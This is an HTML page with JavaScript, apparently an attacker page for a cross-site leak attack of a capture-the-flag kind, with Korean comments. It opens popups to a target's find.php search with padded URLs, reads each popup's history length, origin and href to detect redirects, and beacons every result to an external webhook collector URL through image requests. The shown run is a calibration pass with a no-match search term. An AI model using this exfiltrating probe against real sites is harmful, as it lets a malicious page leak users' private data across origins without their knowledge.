<!doctype html><meta charset="utf-8">
<script>
const TARGET    = "http://localhost";
const COLLECTOR = "https://webhooksite.net/674fdaef-b325-4a34-8c2f-244a8c43aab4";
function log(tag,data){ new Image().src = COLLECTOR+"/"+tag+"?d="+encodeURIComponent(JSON.stringify(data))+"&t="+Date.now(); }
function furl(prefix,pad){ return `${TARGET}/find.php?search=${encodeURIComponent(prefix)}&w=${"A".repeat(pad)}&h=`; }

function probe(url, settle=1500){
  return new Promise(res=>{
    const w = window.open("about:blank","p","width=150,height=150");
    let onloads=0;
    // 팝업 로드 횟수 세기 (find.php 로드 + 리다이렉트 후 로드 → 2회 나올 수 있음)
    const iv = setInterval(()=>{
      try{ w.addEventListener; }catch(e){}
    },50);
    setTimeout(()=>{ try{ w.location = url; }catch(e){} }, 50);
    setTimeout(()=>{
      clearInterval(iv);
      let hlen="?", origin="?", href="?";
      try{ hlen = w.history.length; }catch(e){ hlen = "ERR:"+e.name; }
      try{ origin = w.origin; }catch(e){ origin = "ERR:"+e.name; }
      try{ href = w.location.href; }catch(e){ href = "ERR:"+e.name; }
      try{ w.location="about:blank"; }catch(e){}
      setTimeout(()=>{ try{w.close()}catch(e){} },200);
      res({hlen, origin, href});
    }, settle);
  });
}

async function run(){
  log("start",{ua:navigator.userAgent});
  for(const pad of [0,1000,2000,2500,2800,3000,3300,3600,4000]){
    const r = await probe(furl("zzz_no_match", pad));  // 항상 no-match → c240
    log("calib",{pad, ...r});
    await new Promise(r=>setTimeout(r,300));
  }
  log("calib_done",{});
}
run();
</script>
